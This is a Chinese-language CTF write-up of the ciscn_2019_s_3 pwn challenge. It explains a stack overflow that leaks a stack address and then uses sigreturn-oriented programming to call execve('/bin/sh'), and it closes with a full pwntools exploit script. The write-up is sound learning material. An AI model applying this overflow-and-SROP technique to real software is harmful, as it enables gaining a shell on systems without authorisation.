# ciscn_2019_s_3


之前学习了SROP但是一直没有实践过，刚好这道题需要使用SROP才能利用，记录一下。

<!--more-->

# 涉及知识

+ SROP
+ syscall

# 程序分析

## 保护机制

![image-20200520113325566](https://i.loli.net/2020/05/20/FaOn4zKNxZyWh19.png)

开启NX和部分RELRO

## 程序分析

![image-20200520113343460](https://i.loli.net/2020/05/20/SUsvilxfMgPnh8e.png)

在vuln函数处，看起汇编代码可以知道第一个syscall调用的是read函数并读入0x400个字节数据到buf中，而buf距离rsp只有0x10所以这里存在栈溢出。

![image-20200520113355401](https://i.loli.net/2020/05/20/Ya964GO7S28qyJ5.png)

gadget函数是将rax的值更改为15，而15是signerature的调用好，从这里可以猜测处出题人先考察的是SROP的知识。

## 漏洞利用

漏洞利用分为两步第一步是泄漏stack的值，第二步是调用execve('/bin/sh',0,0)

### 泄漏stack

我们用gdb调试程序后观察到在rsp+0x8处存储了stack地址，而write的大小为0x30刚好可以把rsp+0x8处的地址给leak出来。

![image-20200520113406954](https://i.loli.net/2020/05/20/TnEJNDGHz5t3qIA.png)

### 构造Sgineraturn frame

这里就不详细介绍关于SROP的原理，详细的教程请移步参考链接。由于我们泄露了stack地址我们可以把/bin/sh字符串写到stack中，再构造execve系统调用的sgneraturn frame就可以获得shell。

# EXP

````python

from pwn import *
sh=process('./cis')

context.arch='amd64'
vuln_start=0x00000000004004F1
syscall_ret=0x0000000000400517
hint=0x00000000004004DA
#leack stack
payload='a'*0x10
payload+=p64(vuln_start)
sh.sendline(payload)
stack_addr=u64(sh.recv()[32:40])-0x100

#make signal Frame and get shell
payload='a'*0x10
payload+=p64(hint)
payload+=p64(syscall_ret)
sigframe=SigreturnFrame()
sigframe.rax=constants.SYS_execve
sigframe.rdi=stack_addr+0x110
sigframe.rsi=0
sigframe.rdx=0
sigframe.rsp=stack_addr
sigframe.rip=syscall_ret
payload+=str(sigframe)
payload+=(0x120-len(payload))*'\x00'+'/bin/sh\x00'
sh.sendline(payload)

#gdb.attach(sh)
sh.interactive()
````

# 反思

想要利用SROP的话需要有足够大的溢出空间和system_ret以及修改rax的gadget，不过rax也可以通过read函数读入的个数来进行修改。总的来说感觉SROP是一个挺好玩的利用方法，利用的时候要注意恢复后rsp寄存器的值。

### 参考

[SROP原理](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/)




